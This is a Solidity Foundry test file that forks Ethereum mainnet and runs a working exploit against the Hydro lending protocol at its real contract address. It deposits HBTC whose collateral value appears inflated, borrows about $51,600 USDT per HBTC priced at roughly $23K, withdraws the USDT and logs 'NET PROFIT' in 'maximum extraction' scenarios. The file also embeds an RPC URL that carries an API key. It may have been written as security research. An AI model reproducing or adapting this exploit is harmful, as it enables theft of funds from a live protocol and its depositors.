// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * @title HydroHBTCExploitMax
 * @notice Maximum extraction test - uses all available HBTC from Curve pool
 */
contract HydroHBTCExploitMax is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;

    uint16 constant MARKET_HBTC_USDT = 5;

    struct Action {
        uint8 actionType;
        bytes encodedParams;
    }

    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    function test_max_extraction_2_hbtc() public {
        address attacker = address(this);
        // Use 2 HBTC (all of Curve pool's ~2.055 HBTC, rounded down)
        uint256 hbtcAmount = 2 ether;
        // Max borrow per HBTC: ~$51,669. For 2 HBTC: ~$103,338
        // Use conservative 51,000 per HBTC = 102,000 total
        uint256 borrowAmount = 102000 * 1e6;

        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, hbtcAmount);

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        console.log("=== Max Extraction: 2 HBTC ===");
        console.log("Hydro USDT:", IERC20(USDT).balanceOf(HYDRO) / 1e6);

        IERC20(HBTC).approve(HYDRO, hbtcAmount);

        Action[] memory actions = new Action[](5);

        actions[0] = Action(0, abi.encode(HBTC, hbtcAmount));
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), attacker,
            uint8(1), MARKET_HBTC_USDT, attacker,
            hbtcAmount
        ));
        actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, borrowAmount));
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), MARKET_HBTC_USDT, attacker,
            uint8(0), uint16(0), attacker,
            borrowAmount
        ));
        actions[4] = Action(1, abi.encode(USDT, borrowAmount));

        (bool success, bytes memory ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
        if (!success) {
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint i = 4; i < ret.length; i++) {
                    stripped[i - 4] = ret[i];
                }
                console.log("Revert:", abi.decode(stripped, (string)));
            }
            revert("Batch failed");
        }

        uint256 usdtGained = IERC20(USDT).balanceOf(attacker) - usdtBefore;
        console.log("USDT extracted:", usdtGained / 1e6);
        console.log("HBTC cost (market ~$23K x 2):", uint256(46000));
        console.log("NET PROFIT:", usdtGained / 1e6 - 46000);

        assertGt(usdtGained / 1e6, 46000, "Must exceed cost");
    }

    function test_single_hbtc_max_borrow() public {
        address attacker = address(this);
        uint256 hbtcAmount = 1 ether;
        // Try absolute max: 51,600 USDT (close to theoretical max of 51,669)
        uint256 borrowAmount = 51600 * 1e6;

        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, hbtcAmount);

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        IERC20(HBTC).approve(HYDRO, hbtcAmount);

        Action[] memory actions = new Action[](5);
        actions[0] = Action(0, abi.encode(HBTC, hbtcAmount));
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), attacker,
            uint8(1), MARKET_HBTC_USDT, attacker,
            hbtcAmount
        ));
        actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, borrowAmount));
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), MARKET_HBTC_USDT, attacker,
            uint8(0), uint16(0), attacker,
            borrowAmount
        ));
        actions[4] = Action(1, abi.encode(USDT, borrowAmount));

        (bool success, bytes memory ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
        if (!success) {
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint i = 4; i < ret.length; i++) {
                    stripped[i - 4] = ret[i];
                }
                console.log("Revert:", abi.decode(stripped, (string)));
            }
            revert("Max borrow failed");
        }

        uint256 usdtGained = IERC20(USDT).balanceOf(attacker) - usdtBefore;
        console.log("=== Max Single HBTC ===");
        console.log("USDT extracted:", usdtGained / 1e6);
        console.log("NET PROFIT (after $23K cost):", usdtGained / 1e6 - 23000);

        assertGt(usdtGained / 1e6, 23000);
    }
}
